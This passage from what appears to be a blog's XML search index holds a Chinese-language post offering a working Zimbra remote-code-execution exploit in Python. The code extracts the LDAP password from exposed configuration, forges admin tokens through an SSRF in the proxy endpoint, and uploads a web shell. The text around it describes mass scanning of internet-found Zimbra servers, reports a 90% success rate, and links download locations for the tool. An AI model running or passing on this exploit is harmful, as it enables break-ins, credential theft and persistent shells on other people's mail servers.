+<p>#low_token Stage<br>import re<br>pattern_name = re.compile(r”&lt;key name=(&quot;|”)zimbra_user(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>pattern_password = re.compile(r”&lt;key name=(&quot;|”)zimbra_ldap_password(&quot;|”)&gt;\n.<em>?&lt;value&gt;(.</em>?)&lt;/value&gt;”)<br>username = pattern_name.findall(r.text)[0][2]<br>password = pattern_password.findall(r.text)[0][2]<br>print(username)<br>print(password)</p>
+<p>auth_body=”””&lt;soap:Envelope xmlns:soap=”<a href="http://www.w3.org/2003/05/soap-envelope&quot;" target="_blank" rel="noopener">http://www.w3.org/2003/05/soap-envelope&quot;</a>&gt;<br>   &lt;soap:Header&gt;<br>       &lt;context xmlns=”urn:zimbra”&gt;<br>           &lt;userAgent name=”ZimbraWebClient - SAF3 (Win)” version=”5.0.15_GA_2851.RHEL5_64”/&gt;<br>       &lt;/context&gt;<br>   &lt;/soap:Header&gt;<br>   &lt;soap:Body&gt;<br>     &lt;AuthRequest xmlns=”{xmlns}”&gt;<br>        &lt;account by=”adminName”&gt;{username}&lt;/account&gt;<br>        &lt;password&gt;{password}&lt;/password&gt;<br>     &lt;/AuthRequest&gt;<br>   &lt;/soap:Body&gt;<br>&lt;/soap:Envelope&gt;<br>“””<br>print(“[*] Get Low Privilege Auth Token”)<br>r=requests.post(base_url+”/service/soap”,data=auth_body.format(xmlns=”urn:zimbraAccount”,username=username,password=password),verify=False)</p>
+<p>pattern_auth_token=re.compile(r”&lt;authToken&gt;(.*?)&lt;/authToken&gt;”)</p>
+<p>low_priv_token = pattern_auth_token.findall(r.text)[0]</p>
+<p>#print(low_priv_token)</p>
+<h1 id="SSRF-Get-Admin-Token-Stage"><a href="#SSRF-Get-Admin-Token-Stage" class="headerlink" title="SSRF+Get Admin_Token Stage"></a>SSRF+Get Admin_Token Stage</h1><p>headers[“Cookie”]=”ZM_ADMIN_AUTH_TOKEN=”+low_priv_token+”;”<br>headers[“Host”]=”foo:7071”<br>print(“[*] Get Admin  Auth Token By SSRF”)<br>r = requests.post(base_url+”/service/proxy?target=<a href="https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False" target="_blank" rel="noopener">https://127.0.0.1:7071/service/admin/soap&quot;,data=auth_body.format(xmlns=&quot;urn:zimbraAdmin&quot;,username=username,password=password),headers=headers,verify=False</a>)</p>
+<p>admin_token =pattern_auth_token.findall(r.text)[0]<br>#print(“ADMIN_TOKEN:”+admin_token)</p>
+<p>f = {<br>    ‘filename1’:(None,”whocare”,None),<br>    ‘clientFile’:(filename,fileContent,”text/plain”),<br>    ‘requestId’:(None,”12”,None),<br>}</p>
+<p>headers ={<br>    “Cookie”:”ZM_ADMIN_AUTH_TOKEN=”+admin_token+”;”<br>}<br>print(“[<em>] Uploading file”)<br>r = requests.post(base_url+”/service/extension/clientUploader/upload”,files=f,headers=headers,verify=False)<br>#print(r.text)<br>print(“Shell: “+base_url+”/downloads/“+filename)<br>#print(“Connect &quot;shell.jsp&quot; using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)”)<br>print(“[</em>] Request Result:”)<br>s = requests.session()<br>r = s.get(base_url+”/downloads/“+filename,verify=False,headers=headers)<br>#print(r.text)<br>print(“May need cookie:”)<br>print(headers[‘Cookie’])<br></p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><strong><span style="font-size: 16px;">配合Cscan使用(批量使用url.txt) </span><br></strong></p>
+<p>Cscan.ini配置如下</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra1.png"></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra2.png"></p>
+<p>Cscan扫禁ping机器需加nocheck参数</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra3.png"></p>
+<p><strong><span style="font-size: 16px;">钟馗之眼随便抓一些Zimbra来测试，发现成功率高达90%</span></strong></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/zimbra4.png"></p>
+<p>&nbsp;</p>
+<p><strong>下载</strong></p>
+<p>EXP: <a href="https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/Zimbra_Rce.py</a></p>
+<p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
+<p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>Ladon</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>GetShell</tag>
+        <tag>Zimbra</tag>
       </tags>
   </entry>
 </search>
